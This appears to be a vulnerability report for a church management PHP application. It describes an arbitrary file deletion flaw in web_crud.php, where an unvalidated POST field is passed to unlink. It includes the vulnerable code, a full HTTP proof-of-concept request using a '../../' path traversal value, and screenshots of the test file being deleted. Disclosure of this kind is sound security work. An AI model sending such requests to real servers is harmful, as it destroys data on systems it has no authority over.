### Vulnerability file address

In line 469 of `church/admin/app/web_crud.php`, `@unlink("../../assets/images/" . $_POST['old_category_img']);`,` $_POST['old_category_img']` parameters have not been restricted, which causes any file to be deleted

```php
if ($_FILES['categoryphoto']['tmp_name'] != '') {
            $filepath = "../../assets/images/" . generateUniqueFileName($_FILES["categoryphoto"]["name"]);

            if (move_uploaded_file($_FILES["categoryphoto"]["tmp_name"], $filepath)) {
                $img10 = basename($filepath);
                @unlink("../../assets/images/" . $_POST['old_category_img']);
            }
        }
```

### POC

```http
POST /church/admin/app/web_crud.php HTTP/1.1
Host: www.church.net
Connection: close
Cookie: PHPSESSID=hl5noegsdjn1ru7skoi8tmqco3
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Length: 383

------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="update6"

1
------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="old_category_img"

../../21.txt
------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="categoryphoto";filename="aaa.php"

this is test
------WebKitFormBoundaryTZGvWJmfBtMK9O8p--
```

### Attack results pictures

First, we create a `21.txt` file in the `church/` directory

![image-20250505170302418](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505051703459.png)



Then we execute the above poc to attack

![image-20250505170319847](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505051703876.png)



Files are deleted after the attack is successful

![image-20250505170331320](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505051703352.png)